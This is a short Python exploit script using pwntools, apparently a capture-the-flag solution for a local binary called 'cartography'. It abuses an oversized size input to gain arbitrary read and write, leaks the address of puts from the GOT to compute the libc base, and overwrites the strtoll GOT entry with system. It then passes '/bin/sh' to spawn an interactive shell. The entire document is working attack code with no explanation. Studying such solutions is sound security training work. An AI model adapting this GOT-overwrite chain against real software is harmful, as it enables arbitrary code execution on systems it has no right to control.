#!/usr/bin/python3

from pwn import *

binary = ELF('./cartography')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(['stdbuf','-i0','-o0','-e0',binary.path])

# null pointer
p.sendlineafter('>','0')
p.sendlineafter('Enter the sector\'s size:\n',str(2**48 - 1))

# leak libc
p.sendlineafter('> ','2')
p.sendlineafter('Where do you want to read?\n',str(binary.got['puts']))
p.sendlineafter('How much do you want to read?\n','8')
puts = u64(p.recv(8))
log.info('puts: ' + hex(puts))
baselibc = puts - libc.symbols['puts']
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc

# strtoall -> system
p.sendlineafter('> ','1')
p.sendlineafter('Where do you want to write?',str(binary.got['strtoll']))
p.sendlineafter('How much do you want to write?\n','8')
p.sendlineafter('Enter your sensor data:',p64(libc.symbols['system']))

# get a shell
p.sendlineafter('>','0')
p.sendlineafter('Enter the sector\'s size:\n','/bin/sh')
p.interactive()
